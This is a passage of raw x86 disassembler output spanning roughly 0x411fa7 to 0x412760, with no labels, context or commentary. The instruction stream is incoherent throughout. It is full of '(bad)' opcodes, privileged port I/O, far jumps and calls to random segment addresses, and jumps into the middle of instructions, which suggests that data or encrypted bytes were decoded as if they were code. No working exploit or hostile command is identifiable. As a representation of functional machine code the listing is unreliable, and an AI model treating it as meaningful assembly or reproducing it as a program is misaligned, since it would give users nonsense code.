  411fa7:	loope  0x411f42
  411fa9:	or     ebp,ebp
  411fab:	fistp  DWORD PTR [esi-0x7]
  411fae:	cld    
  411faf:	or     ebx,DWORD PTR [edx+0x7412c429]
  411fb5:	cmp    edi,DWORD PTR [ecx-0x97916c3]
  411fbb:	(bad)
  411fbe:	jae    0x411f51
  411fc0:	jns    0x41201f
  411fc2:	pop    eax
  411fc3:	mov    ebp,0xcfe9750a
  411fc8:	ret    
  411fc9:	repnz add al,0x73
  411fcc:	pop    edx
  411fcd:	in     al,0xa5
  411fcf:	sub    eax,0x14bf0afb
  411fd4:	stos   BYTE PTR es:[edi],al
  411fd5:	test   al,0xdf
  411fd7:	jmp    0x412004
  411fd9:	ret    
  411fda:	frstor [edx-0x33]
  411fdd:	loopne 0x411f97
  411fdf:	retf   
  411fe0:	xchg   BYTE PTR [eax-0x44ee6c60],dl
  411fe6:	out    0x9b,eax
  411fe8:	or     eax,0xd7b15256
  411fed:	xchg   esi,eax
  411fee:	xchg   ecx,eax
  411fef:	bound  ebp,QWORD PTR [ecx+0x3b]
  411ff2:	xor    al,0xc0
  411ff4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ff5:	mov    eax,0x4ba501b8
  411ffa:	jb     0x412033
  411ffc:	push   cs
  411ffd:	loope  0x411fe5
  411fff:	pusha  
  412000:	jmp    0xe227:0x73e54bb4
  412007:	push   DWORD PTR [ebx-0x43dadd8e]
  41200d:	sbb    al,0x9a
  41200f:	in     al,0x7a
  412011:	icebp  
  412012:	or     eax,0xd76b2c69
  412017:	push   edi
  412018:	cmp    bl,al
  41201a:	aam    0xdb
  41201c:	sbb    eax,0x666b25c1
  412021:	retf   0x526f
  412024:	jmp    0x7398:0x429518c0
  41202b:	rol    BYTE PTR [edx],0x27
  41202e:	and    eax,0xce3bef14
  412033:	stos   BYTE PTR es:[edi],al
  412034:	jb     0x412052
  412036:	lods   al,BYTE PTR ds:[esi]
  412037:	outs   dx,BYTE PTR ds:[esi]
  412038:	(bad)  
  412039:	les    ebp,FWORD PTR [ebx-0x63]
  41203c:	pop    ds
  41203d:	inc    esp
  41203e:	ficomp WORD PTR [eax]
  412040:	into   
  412041:	out    dx,al
  412042:	mov    ds:0x208eb9f8,eax
  412047:	jbe    0x41204a
  412049:	ror    BYTE PTR [eax],cl
  41204b:	add    al,0x76
  41204d:	sub    eax,0xe39a0ed1
  412052:	jg     0x412032
  412054:	shl    BYTE PTR [ebp+0x1d],1
  412057:	stc    
  412058:	lods   al,BYTE PTR ds:[si]
  41205a:	jl     0x411ff6
  41205c:	sti    
  41205d:	lock je 0x4120ca
  412060:	add    BYTE PTR ds:0x85ace57a,cl
  412066:	ins    DWORD PTR es:[edi],dx
  412067:	iret   
  412068:	mov    ?,WORD PTR [eax-0x3b15e199]
  41206e:	push   ds
  41206f:	xchg   esi,eax
  412070:	enter  0x464a,0x3b
  412074:	mov    al,ds:0x6ba4bbe4
  412079:	leave  
  41207a:	add    BYTE PTR [ecx],0x5a
  41207d:	and    BYTE PTR [ecx],bh
  41207f:	mov    dl,0xa1
  412081:	jp     0x4120f4
  412083:	shld   DWORD PTR [eax],ecx,0x78
  412087:	fwait
  412088:	xchg   esi,eax
  412089:	int    0x14
  41208b:	adc    ebx,DWORD PTR [edx+0x18]
  41208e:	iret   
  41208f:	push   esp
  412090:	jb     0x412045
  412092:	dec    esi
  412093:	shl    BYTE PTR [esi+0x1b35252],0x4d
  41209a:	(bad)  
  41209b:	add    BYTE PTR [bx+di-0x59],dh
  41209f:	ins    BYTE PTR es:[edi],dx
  4120a0:	mov    esi,0x4f7aa27e
  4120a5:	rcr    dl,1
  4120a7:	mov    bl,0x67
  4120a9:	mov    es,WORD PTR [ebp+0x434d8752]
  4120af:	pop    ds
  4120b0:	je     0x4120aa
  4120b2:	in     eax,0x77
  4120b4:	retf   0x8c35
  4120b7:	mov    BYTE PTR [edx+0x176226cd],dh
  4120bd:	cmp    al,BYTE PTR [eax]
  4120bf:	dec    edi
  4120c0:	push   esi
  4120c1:	and    eax,0xad4aad39
  4120c6:	adc    eax,0xdcdea6be
  4120cb:	mov    bh,0x41
  4120cd:	and    bl,ch
  4120cf:	mov    cl,0x9d
  4120d1:	xor    ebx,DWORD PTR [esi]
  4120d3:	icebp  
  4120d4:	scas   eax,DWORD PTR es:[edi]
  4120d5:	adc    bl,dh
  4120d7:	cmc    
  4120d8:	lds    eax,FWORD PTR [edx+edx*2-0x4a]
  4120dc:	mov    edx,0x5114de6c
  4120e1:	test   BYTE PTR [eax+ebx*8-0x3fad7833],dl
  4120e8:	scas   eax,DWORD PTR es:[edi]
  4120e9:	jecxz  0x412094
  4120eb:	ins    BYTE PTR es:[edi],dx
  4120ec:	scas   al,BYTE PTR es:[edi]
  4120ed:	mov    esi,0x582ad804
  4120f2:	sbb    DWORD PTR [ecx],edx
  4120f4:	ret    
  4120f5:	stos   DWORD PTR es:[edi],eax
  4120f6:	clc    
  4120f7:	pop    eax
  4120f8:	mov    edi,0x792eb6d0
  4120fd:	xchg   edi,eax
  4120fe:	or     eax,0x9e37c328
  412103:	xor    al,0x23
  412105:	in     eax,dx
  412106:	mov    edx,eax
  412108:	and    ecx,edi
  41210a:	inc    edx
  41210b:	lock sub DWORD PTR [eax-0x7d],esi
  41210f:	inc    esi
  412110:	out    0x4c,al
  412112:	pushf  
  412113:	out    0x80,al
  412115:	ins    DWORD PTR es:[edi],dx
  412116:	jae    0x412128
  412118:	cmc    
  412119:	es sbb al,0x59
  41211c:	gs dec cx
  41211f:	jge    0x41216e
  412121:	into   
  412122:	(bad)  
  412123:	int    0xf5
  412125:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412126:	sub    dh,ch
  412128:	mov    DWORD PTR [ebx-0x56ae6219],esi
  41212e:	loop   0x412163
  412130:	aad    0x4c
  412132:	and    bh,ah
  412134:	pop    edx
  412135:	push   edi
  412136:	push   ebx
  412137:	mov    ebx,0xc17f0e64
  41213c:	outs   dx,BYTE PTR ds:[esi]
  41213d:	sub    bh,BYTE PTR [edx+0x54]
  412140:	push   edi
  412141:	icebp  
  412142:	loop   0x412113
  412144:	aad    0x2d
  412146:	add    eax,0x4979812
  41214b:	lock addr16 cmp eax,0x201b27de
  412152:	out    0xcd,eax
  412154:	sbb    al,0x72
  412156:	dec    ebp
  412157:	repz fisttp WORD PTR [ebx]
  41215a:	xchg   edi,eax
  41215b:	test   DWORD PTR [ebp+0x24b2df89],ebp
  412161:	jg     0x4121a0
  412163:	not    DWORD PTR [ebp-0x32]
  412166:	push   esp
  412167:	imul   esi,DWORD PTR [edx],0xffffffd8
  41216a:	dec    edi
  41216b:	sbb    dl,BYTE PTR [esp+ebx*8-0x91fc381]
  412172:	arpl   WORD PTR [ebx-0x39],ax
  412175:	mov    edx,0xbf5d5f77
  41217a:	data16 icebp 
  41217c:	add    eax,ecx
  41217e:	fs mov esp,0x1f02b02c
  412184:	pop    ss
  412185:	push   0xb
  412187:	inc    ebx
  412188:	cmp    eax,DWORD PTR [ebx-0x572c268]
  41218e:	ds cmp ah,al
  412191:	xchg   BYTE PTR [esi],dh
  412193:	fld    QWORD PTR [ebp+0x5]
  412196:	test   eax,0x48d001ee
  41219b:	cmp    ebx,ebx
  41219d:	test   DWORD PTR [ebp+ecx*4-0x2],edi
  4121a1:	repnz inc DWORD PTR [ecx-0x6790c923]
  4121a8:	ins    DWORD PTR es:[edi],dx
  4121a9:	lock cmp dh,BYTE PTR [edx+0x3c27742a]
  4121b0:	fstp   QWORD PTR [ebx]
  4121b2:	(bad)  
  4121b3:	rsqrtps xmm1,XMMWORD PTR gs:[esi]
  4121b7:	bound  ecx,QWORD PTR [eax]
  4121b9:	repnz shl edx,cl
  4121bc:	push   ss
  4121bd:	sub    edi,DWORD PTR [ecx-0xd]
  4121c0:	retf   0x41d8
  4121c3:	fldpi  
  4121c5:	and    al,0x0
  4121c7:	or     al,0x2d
  4121c9:	outs   dx,DWORD PTR ds:[esi]
  4121ca:	jmp    0x7142d739
  4121cf:	lods   eax,DWORD PTR ds:[esi]
  4121d0:	into   
  4121d1:	fdiv   DWORD PTR [esi-0x63a6d189]
  4121d7:	rcr    DWORD PTR [edx+0x59],cl
  4121da:	sub    edi,edi
  4121dc:	fmul   st(7),st
  4121de:	xor    dl,BYTE PTR [ecx]
  4121e0:	imul   ebx
  4121e2:	sbb    eax,DWORD PTR [eax]
  4121e4:	cli    
  4121e5:	sahf   
  4121e6:	test   eax,0x1ea442b3
  4121eb:	jae    0x4121b7
  4121ed:	out    dx,al
  4121ee:	jnp    0x412221
  4121f0:	shl    DWORD PTR [edi-0xf],0x64
  4121f4:	cmc    
  4121f5:	mov    ecx,0xf54be8d5
  4121fa:	pop    es
  4121fb:	pop    ds
  4121fc:	out    dx,al
  4121fd:	or     BYTE PTR [edi+eiz*1+0x36e7e6fc],0x9
  412205:	push   esi
  412206:	les    ecx,FWORD PTR [edx-0x785d34dc]
  41220c:	push   esp
  41220d:	or     esp,0x1a366dc9
  412213:	leave  
  412214:	mov    eax,0x7a08c80e
  412219:	stos   DWORD PTR es:[edi],eax
  41221a:	stos   DWORD PTR es:[edi],eax
  41221b:	fstp   QWORD PTR ds:0x72f77cbe
  412221:	jno    0x412293
  412223:	mov    ?,WORD PTR [eax+0x7d7303d5]
  412229:	and    bh,cl
  41222b:	retw   
  41222d:	cmp    eax,0x1d8a8c8b
  412232:	cld    
  412233:	addr16 aas 
  412235:	fwait
  412236:	xchg   esp,eax
  412237:	popf   
  412238:	(bad)  
  412239:	dec    edx
  41223a:	push   ds
  41223b:	or     eax,0x4b6f3974
  412240:	fisub  DWORD PTR [esi+edx*4]
  412243:	aas    
  412244:	jne    0x412220
  412246:	popa   
  412247:	cs sub ch,ch
  41224a:	mov    al,ds:0x3ad7da7
  41224f:	aaa    
  412250:	mov    DWORD PTR [eax-0x28],esp
  412253:	cmp    dh,BYTE PTR [ebx-0x6b]
  412256:	sti    
  412257:	nop
  412258:	jle    0x4122be
  41225a:	call   0x2664:0xe552ec47
  412261:	pop    ds
  412262:	jle    0x41222f
  412264:	out    0x23,eax
  412266:	test   bh,dl
  412268:	push   esi
  412269:	jp     0x412209
  41226b:	cmp    ebx,DWORD PTR [edx-0x66570e4e]
  412271:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412272:	dec    ebp
  412273:	(bad)  
  412274:	mov    dl,0x52
  412276:	loop   0x412247
  412278:	sar    BYTE PTR [esp+edi*8-0x23],0x18
  41227d:	sbb    esp,DWORD PTR [edi+0x139864d]
  412283:	(bad)  
  412284:	test   al,0xfe
  412286:	push   ss
  412287:	(bad)  
  412288:	or     BYTE PTR [edi-0x501344f9],dl
  41228e:	add    cl,ch
  412290:	sbb    al,0xe1
  412292:	cmp    eax,0x40c16229
  412297:	fdivr  DWORD PTR [ebp+0x1]
  41229a:	loopne 0x412316
  41229c:	mov    WORD PTR [ebx],?
  41229e:	shl    edi,0x49
  4122a1:	repz pop esi
  4122a3:	outs   dx,BYTE PTR ds:[esi]
  4122a4:	push   edi
  4122a5:	imul   esp,DWORD PTR [ebx-0x19],0x4
  4122a9:	cmp    ebp,ebx
  4122ab:	nop
  4122ac:	mov    ds,esp
  4122ae:	dec    esp
  4122af:	sbb    DWORD PTR ds:0x11da00e7,eax
  4122b5:	jnp    0x4122cd
  4122b7:	shr    DWORD PTR [eax+0x3935d4d],cl
  4122bd:	mul    DWORD PTR [ecx-0x71]
  4122c0:	sub    BYTE PTR [edi],ch
  4122c2:	adc    al,0x23
  4122c4:	rcr    DWORD PTR [esi-0x7f],cl
  4122c7:	pop    ecx
  4122c8:	mov    ebx,0x25ae6026
  4122cd:	dec    esi
  4122ce:	aas    
  4122cf:	outs   dx,DWORD PTR ds:[esi]
  4122d0:	fadd   st(2),st
  4122d2:	mov    ebp,0xd9bc4172
  4122d7:	cwde   
  4122d8:	inc    edx
  4122d9:	sub    edx,DWORD PTR [esi+0x76dca05b]
  4122df:	sti    
  4122e0:	inc    ecx
  4122e1:	in     eax,dx
  4122e2:	xor    al,ah
  4122e4:	sar    BYTE PTR [esi+ebx*4+0x74],0x7a
  4122e9:	add    DWORD PTR [ebx-0x59defaef],ebp
  4122ef:	push   es
  4122f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4122f1:	push   0x171ef725
  4122f6:	xchg   edx,eax
  4122f7:	or     DWORD PTR [edx-0x38],ecx
  4122fa:	xchg   ebx,eax
  4122fb:	and    eax,0x556dc59c
  412300:	fdivrp st(4),st
  412302:	xor    al,0x6
  412304:	adc    DWORD PTR [ebp-0x7f],ecx
  412307:	loop   0x412294
  412309:	pop    eax
  41230a:	sbb    al,0x80
  41230c:	or     al,0x81
  41230e:	retf   0x1821
  412311:	sbb    al,0x3a
  412313:	add    al,0xb4
  412315:	add    al,0x3
  412317:	in     eax,dx
  412318:	dec    esp
  412319:	jo     0x4122f9
  41231b:	sbb    ebx,DWORD PTR ds:0x2f564401
  412321:	imul   ebp,DWORD PTR [esp+edi*8-0x74],0x24
  412326:	sti    
  412327:	ret    0x392e
  41232a:	jecxz  0x412338
  41232c:	(bad)  
  41232d:	sub    DWORD PTR [eax+esi*2-0x45],ecx
  412331:	(bad)  
  412332:	and    eax,DWORD PTR [edx-0x1189cb96]
  412338:	adc    al,0x27
  41233a:	ds stos BYTE PTR es:[edi],al
  41233c:	mov    ch,0x23
  41233e:	mov    esi,0xb6e176c9
  412343:	inc    edi
  412344:	mov    cl,bh
  412346:	push   es
  412347:	ror    DWORD PTR [edi],0x46
  41234a:	push   cs
  41234b:	retf   0xb38e
  41234e:	xlat   BYTE PTR ds:[ebx]
  41234f:	lods   ax,WORD PTR ds:[esi]
  412351:	pop    eax
  412352:	push   0x52ddc694
  412357:	in     al,dx
  412358:	outs   dx,DWORD PTR ds:[esi]
  412359:	imul   edx,ebp,0x3e543d2a
  41235f:	jbe    0x41232d
  412361:	retf   
  412362:	iret   
  412363:	(bad)  
  412365:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412366:	xchg   ebx,eax
  412367:	repnz xchg ebx,ebp
  41236a:	js     0x4122ff
  41236c:	popf   
  41236d:	pop    esp
  41236e:	es cld 
  412370:	rep outs dx,BYTE PTR ds:[esi]
  412372:	dec    ecx
  412373:	bound  eax,QWORD PTR [ecx+eiz*8-0x19dc601c]
  41237a:	push   eax
  41237b:	repnz stos DWORD PTR es:[edi],eax
  41237d:	cmp    al,cl
  41237f:	jns    0x41238b
  412381:	ret    0x6896
  412384:	addr16 cli 
  412386:	mov    bh,0x83
  412388:	scas   al,BYTE PTR es:[edi]
  412389:	jge    0x41231a
  41238b:	shr    DWORD PTR [esi],cl
  41238d:	xor    ecx,DWORD PTR [ecx+0x57129b79]
  412393:	cwde   
  412394:	or     ebx,DWORD PTR [esi-0x53]
  412397:	pop    ecx
  412398:	mov    edx,0x6bf3ebef
  41239d:	fmulp  st(1),st
  41239f:	(bad)  
  4123a0:	(bad)  
  4123a1:	pop    edi
  4123a2:	sub    al,0xbf
  4123a4:	jmp    0xa6b8:0x1cc8e90c
  4123ab:	fwait
  4123ac:	push   ebp
  4123ad:	push   edx
  4123ae:	xchg   DWORD PTR [esi],eax
  4123b0:	dec    ebx
  4123b1:	push   ds
  4123b2:	push   edx
  4123b3:	mov    dl,0xca
  4123b5:	or     bl,0x25
  4123b8:	ret    0xcf14
  4123bb:	pop    edi
  4123bc:	push   ebp
  4123bd:	mov    esi,0x275d1a56
  4123c2:	leave  
  4123c3:	test   al,0x16
  4123c5:	and    eax,0x8697d5f0
  4123ca:	fcom   QWORD PTR [esi-0x2b6a3e9c]
  4123d0:	ins    DWORD PTR es:[edi],dx
  4123d1:	push   0xeddcc84f
  4123d6:	loopne 0x4123ff
  4123d8:	(bad)  
  4123d9:	cld    
  4123da:	jns    0x412425
  4123dc:	sbb    BYTE PTR [ebp+0xaeff496],bl
  4123e2:	mov    ebx,0xc91da46
  4123e7:	int3   
  4123e8:	(bad)  
  4123ea:	inc    ecx
  4123eb:	stos   BYTE PTR es:[edi],al
  4123ec:	popf   
  4123ed:	push   cs
  4123ee:	sti    
  4123ef:	daa    
  4123f0:	out    dx,al
  4123f1:	push   ecx
  4123f2:	cmp    BYTE PTR [eax],ah
  4123f4:	inc    edx
  4123f5:	mov    al,ds:0x6463b36e
  4123fa:	sub    BYTE PTR [ebx],ch
  4123fc:	out    dx,eax
  4123fd:	sbb    edx,esp
  4123ff:	jae    0x41240a
  412401:	aaa    
  412402:	sbb    eax,esp
  412404:	xor    DWORD PTR [edi+0x5dffa22d],ebp
  41240a:	stc    
  41240b:	std    
  41240c:	fisub  WORD PTR [eax]
  41240e:	or     ch,dl
  412410:	pop    ebx
  412411:	pop    esi
  412412:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412413:	out    dx,eax
  412414:	mov    ds:0x2ab0a0da,eax
  412419:	call   0x397a:0x13fea0a6
  412420:	arpl   WORD PTR [ebx+0x5b],sp
  412423:	popf   
  412424:	outs   dx,DWORD PTR ds:[esi]
  412425:	dec    esi
  412426:	je     0x412406
  412428:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41242a:	repz add bh,BYTE PTR [ecx-0x13]
  41242e:	xchg   ebp,eax
  41242f:	out    0xdd,al
  412431:	test   al,0x1c
  412433:	mov    ecx,0x2ddd2cf2
  412438:	dec    edi
  412439:	dec    ebx
  41243a:	outs   dx,BYTE PTR ds:[esi]
  41243b:	into   
  41243c:	pop    ss
  41243d:	nop
  41243e:	pusha  
  41243f:	jmp    0x16133dc8
  412444:	test   al,0xf9
  412446:	retf   0x8aab
  412449:	retf   0xcc74
  41244c:	mov    al,ds:0xff648218
  412451:	scas   al,BYTE PTR es:[edi]
  412452:	ins    BYTE PTR es:[edi],dx
  412453:	cmp    BYTE PTR [esi-0x51],cl
  412456:	push   ecx
  412457:	shl    edx,0x98
  41245a:	into   
  41245b:	sahf   
  41245c:	adc    BYTE PTR [esi+0x2b917080],ch
  412462:	inc    esp
  412463:	test   BYTE PTR [esi+0x5fac7a2],cl
  412469:	call   0x4fb88db6
  41246e:	dec    ecx
  41246f:	add    eax,0x243f26dd
  412474:	jnp    0x4124e5
  412476:	inc    edx
  412477:	cdq    
  412478:	ficomp WORD PTR [ecx]
  41247a:	shl    BYTE PTR [edx+0x1a2e37e8],1
  412480:	push   ebp
  412481:	stos   BYTE PTR es:[edi],al
  412482:	xchg   edx,eax
  412483:	pop    esi
  412484:	fidiv  DWORD PTR [eax+0x13d40989]
  41248a:	pop    esp
  41248b:	mov    al,0x90
  41248d:	mov    al,BYTE PTR [edi]
  41248f:	jge    0x41249c
  412491:	out    0xa2,al
  412493:	nop
  412494:	retf   
  412495:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412496:	xor    esi,eax
  412498:	push   ebx
  412499:	aaa    
  41249a:	xlat   BYTE PTR ds:[ebx]
  41249b:	imul   eax,ecx,0x2a
  41249e:	js     0x412438
  4124a0:	inc    ecx
  4124a1:	adc    al,0x44
  4124a3:	icebp  
  4124a4:	aaa    
  4124a5:	cmc    
  4124a6:	inc    esp
  4124a7:	inc    edx
  4124a8:	sti    
  4124a9:	popf   
  4124aa:	xchg   ebx,eax
  4124ab:	and    DWORD PTR [esi],eax
  4124ad:	popf   
  4124ae:	lahf   
  4124af:	jbe    0x41249c
  4124b1:	jb     0x412512
  4124b3:	xor    dh,al
  4124b5:	mov    dh,0x22
  4124b7:	scas   al,BYTE PTR es:[edi]
  4124b8:	fisub  WORD PTR [ecx]
  4124ba:	imul   BYTE PTR [esi-0x80]
  4124bd:	(bad)  
  4124be:	(bad)  [edi]
  4124c0:	lock jl 0x41250c
  4124c3:	and    DWORD PTR [esi-0x53],esi
  4124c6:	hlt    
  4124c7:	test   al,0x82
  4124c9:	dec    eax
  4124ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124cb:	nop
  4124cc:	(bad)  
  4124cd:	std    
  4124ce:	mov    BYTE PTR [eax],dl
  4124d0:	sbb    cl,BYTE PTR [edi-0x13d6bc12]
  4124d6:	cmp    ch,BYTE PTR [eax]
  4124d8:	cmp    al,0x66
  4124da:	lahf   
  4124db:	not    BYTE PTR [ecx-0x6a49f15]
  4124e1:	pop    ss
  4124e2:	push   0x32
  4124e4:	pop    edi
  4124e5:	cmp    al,0x7
  4124e7:	aas    
  4124e8:	xor    edi,DWORD PTR [edx]
  4124ea:	mov    esp,0xc3e87d4a
  4124ef:	sbb    eax,0xffffff8e
  4124f2:	shr    DWORD PTR [esi],1
  4124f4:	inc    eax
  4124f5:	cdq    
  4124f6:	pusha  
  4124f7:	adc    BYTE PTR [esi+edi*8],bh
  4124fa:	enter  0xd2f5,0x47
  4124fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4124ff:	and    BYTE PTR [edx+ebx*8+0x14f1e382],cl
  412506:	(bad)  
  412507:	cli    
  412508:	or     eax,0x4930543b
  41250d:	pop    ebp
  41250e:	sub    dl,BYTE PTR ds:[ecx+0xe4a47d3]
  412515:	add    al,0x98
  412517:	mov    BYTE PTR [eax-0x48],bh
  41251a:	rcl    DWORD PTR [esi+0x1fd7174c],0x7d
  412521:	jecxz  0x41256b
  412523:	stos   DWORD PTR es:[edi],eax
  412524:	shl    BYTE PTR [edi+0x75c603cf],0x20
  41252b:	add    ebp,ecx
  41252d:	push   ebx
  41252e:	call   FWORD PTR [eax]
  412530:	pop    ds
  412531:	in     al,0x44
  412533:	push   esi
  412534:	jge    0x4124c0
  412536:	pop    ecx
  412537:	push   0xa14dcabd
  41253c:	lahf   
  41253d:	jno    0x412595
  41253f:	xchg   ebp,eax
  412540:	mov    eax,ds:0xf97dd94
  412545:	xor    BYTE PTR [ebx+ebp*8+0x56eed0be],dh
  41254c:	sbb    al,0x6
  41254e:	xchg   esp,eax
  41254f:	mov    ch,0xbd
  412551:	dec    edi
  412552:	pusha  
  412553:	and    DWORD PTR [edx],edi
  412555:	nop
  412556:	scas   al,BYTE PTR es:[edi]
  412557:	cmc    
  412558:	out    dx,eax
  412559:	imul   esp,DWORD PTR [eax],0xa34fc1c5
  41255f:	sbb    dl,BYTE PTR [ebp+0x4c]
  412562:	mov    bl,0xbe
  412564:	repnz rcr cl,1
  412567:	pop    ebx
  412568:	sar    bh,1
  41256a:	jmp    0x4c2e563a
  41256f:	ret    
  412570:	push   edi
  412571:	push   edx
  412572:	push   edi
  412573:	in     al,dx
  412574:	mov    edx,0x33d39276
  412579:	or     esi,DWORD PTR [ebp-0x4b286547]
  41257f:	retf   0xba60
  412582:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412583:	xor    esp,DWORD PTR [ebx+0x76]
  412586:	jge    0x4125eb
  412588:	leave  
  412589:	inc    esp
  41258a:	dec    edx
  41258b:	mov    ch,0x2f
  41258d:	mov    DWORD PTR [ecx+0xb7b72f9],ebp
  412593:	daa    
  412594:	push   ecx
  412595:	add    dl,BYTE PTR [eax+0x2f87dd55]
  41259b:	push   ebx
  41259c:	inc    bx
  41259e:	or     bl,cl
  4125a0:	fst    QWORD PTR [ecx-0x1e]
  4125a3:	add    ebp,DWORD PTR [ebx-0x356e24ba]
  4125a9:	cmp    ecx,DWORD PTR [edi+eiz*2-0x39]
  4125ad:	dec    ebx
  4125ae:	jae    0x412623
  4125b0:	les    edi,FWORD PTR [ecx+eax*1]
  4125b3:	adc    ah,BYTE PTR [ebx-0x4fbb52d7]
  4125b9:	scas   eax,DWORD PTR es:[edi]
  4125ba:	inc    edx
  4125bb:	fisub  DWORD PTR [edi+ebx*8-0x41a4cf1e]
  4125c2:	sar    DWORD PTR [eiz*1-0x4fc42ac3],0xda
  4125ca:	xor    eax,esp
  4125cc:	(bad)  
  4125cd:	lods   al,BYTE PTR ds:[esi]
  4125ce:	shr    bl,0x82
  4125d1:	pop    ss
  4125d2:	cmp    al,dh
  4125d4:	shl    DWORD PTR [edx],cl
  4125d6:	and    al,0x29
  4125d8:	jl     0x41257f
  4125da:	pop    ebx
  4125db:	lock pop eax
  4125dd:	sub    ebx,eax
  4125df:	push   ebx
  4125e0:	out    0x9f,eax
  4125e2:	sbb    BYTE PTR [eax],al
  4125e4:	cmp    BYTE PTR [ebp-0x4a9b35f5],ch
  4125ea:	lahf   
  4125eb:	xchg   edi,eax
  4125ec:	pushf  
  4125ed:	xlat   BYTE PTR ds:[ebx]
  4125ee:	out    dx,eax
  4125ef:	xchg   edi,eax
  4125f0:	or     DWORD PTR [ebp+0x3b915903],0xffffffa0
  4125f7:	mov    eax,ds:0xca3ec3f
  4125fc:	push   edx
  4125fd:	pop    ss
  4125fe:	jbe    0x4125f1
  412600:	xor    DWORD PTR [edi+0x1e7c221],ebx
  412606:	pop    ebp
  412607:	dec    esp
  412609:	xor    al,0x5a
  41260b:	clc    
  41260c:	imul   eax,DWORD PTR [esi+0x2996df89],0xae79ce64
  412616:	int3   
  412617:	lods   al,BYTE PTR ds:[esi]
  412618:	in     eax,0x28
  41261a:	sub    bh,BYTE PTR [edx-0x4]
  41261d:	push   edi
  41261e:	jns    0x41265d
  412620:	out    0xba,al
  412622:	cmp    BYTE PTR [esi+0x11],cl
  412625:	daa    
  412626:	test   eax,0xc59516f7
  41262b:	cmp    ch,BYTE PTR [ebx+0xcc5a1c4]
  412631:	or     dh,al
  412633:	bound  edx,QWORD PTR [ebx+0x71]
  412636:	sub    dl,ch
  412638:	inc    edi
  412639:	nop
  41263a:	sub    bh,BYTE PTR [edx-0x55]
  41263d:	xchg   esp,eax
  41263e:	mov    es,WORD PTR [ecx]
  412640:	pop    edi
  412641:	or     DWORD PTR [ecx+0x21f889f4],ebp
  412647:	sbb    BYTE PTR [eax-0x65],bh
  41264a:	ror    ebp,cl
  41264c:	ins    DWORD PTR es:[edi],dx
  41264d:	push   ss
  41264e:	mov    ss,WORD PTR [edx]
  412650:	lds    ebp,FWORD PTR [esi-0x7f]
  412653:	inc    edx
  412654:	fisttp QWORD PTR [ebx+0x4c8923d]
  41265a:	scas   al,BYTE PTR es:[edi]
  41265b:	call   0xb63a:0xc2e58a13
  412662:	scas   al,BYTE PTR es:[edi]
  412663:	inc    esp
  412664:	xchg   edx,eax
  412665:	hlt    
  412666:	add    dh,ah
  412668:	jo     0x4126ba
  41266a:	cmp    esi,0xffffff8f
  41266d:	sub    al,bh
  41266f:	rol    BYTE PTR [ebp-0x12],cl
  412672:	pushf  
  412673:	cli    
  412674:	pop    ebx
  412675:	mov    dl,0xfb
  412677:	dec    edi
  412678:	dec    esp
  412679:	push   esp
  41267a:	stos   BYTE PTR es:[edi],al
  41267b:	ins    BYTE PTR es:[edi],dx
  41267c:	gs into 
  41267e:	mov    edi,0x9eeba3f1
  412683:	ds mov edx,0x652f74d6
  412689:	scas   eax,DWORD PTR es:[edi]
  41268a:	stos   BYTE PTR es:[edi],al
  41268b:	sbb    al,0xa3
  41268d:	out    dx,eax
  41268e:	mov    ds:0x320283e1,al
  412693:	or     ah,ah
  412695:	imul   esi,DWORD PTR ds:0xa3c9b5d5,0x9ea7e800
  41269f:	cmp    eax,0x37ac76fe
  4126a4:	ds repnz mov bp,0xf209
  4126aa:	jns    0x4126fe
  4126ac:	call   0x296a:0x3e0107ae
  4126b3:	jbe    0x41264d
  4126b5:	mov    eax,0xa36e74c2
  4126ba:	adc    edx,0x4d15bae7
  4126c0:	jb     0x412646
  4126c2:	mov    esi,0xf3f97b9d
  4126c7:	jae    0x41266f
  4126c9:	je     0x41269e
  4126cb:	in     al,dx
  4126cc:	mov    al,0x90
  4126ce:	pop    ss
  4126cf:	pop    edi
  4126d0:	lods   al,BYTE PTR ds:[esi]
  4126d1:	sti    
  4126d2:	jno    0x412731
  4126d4:	shr    dh,0x5c
  4126d7:	adc    ch,BYTE PTR [edx+ecx*4]
  4126da:	sbb    esp,DWORD PTR [ebx+0x2b]
  4126dd:	fistp  QWORD PTR [esi+ecx*1-0xac91340]
  4126e4:	test   al,0x19
  4126e6:	mov    eax,ds:0x1c8c59a1
  4126eb:	or     ch,BYTE PTR [edi+0xf830ce3]
  4126f1:	cmp    eax,DWORD PTR [eax+0x1b9260ed]
  4126f7:	push   es
  4126f8:	in     eax,dx
  4126f9:	das    
  4126fa:	sbb    al,0x69
  4126fc:	sbb    edi,edx
  4126fe:	and    edi,ebx
  412700:	jl     0x412781
  412702:	and    ch,BYTE PTR [esi+0x6efe847a]
  412708:	pop    esp
  412709:	aad    0x94
  41270b:	in     al,0x68
  41270d:	shl    DWORD PTR [ecx-0x5d],1
  412710:	aaa    
  412711:	loopne 0x412715
  412713:	sbb    BYTE PTR [esi-0x29],0x63
  412717:	icebp  
  412718:	inc    ebx
  412719:	pop    esp
  41271a:	mov    edx,0x4da08519
  41271f:	jmp    0x412731
  412721:	xor    al,0x1b
  412723:	push   ebp
  412724:	test   eax,0xfc4bdf7e
  412729:	dec    esi
  41272a:	xlat   BYTE PTR ds:[ebx]
  41272b:	sub    DWORD PTR [ebx+eiz*2],0xfc1b24d5
  412732:	into   
  412733:	out    0xea,al
  412735:	jmp    0xc388:0xeb794cb3
  41273c:	xor    BYTE PTR [ecx-0x103b2ab0],bl
  412742:	fcmovb st,st(2)
  412744:	dec    esp
  412745:	mov    esp,0x6a331b72
  41274a:	es (bad) 
  41274c:	push   ebp
  41274d:	mov    ah,0x85
  41274f:	pop    edx
  412750:	xchg   esp,eax
  412751:	mov    ecx,0xdf7a7f5d
  412756:	scas   eax,DWORD PTR es:[edi]
  412757:	sti    
  412758:	lahf   
  412759:	jo     0x4126ee
  41275b:	mov    eax,0xff1ee913
  412760:	or     al,BYTE PTR [edi-0x3b]
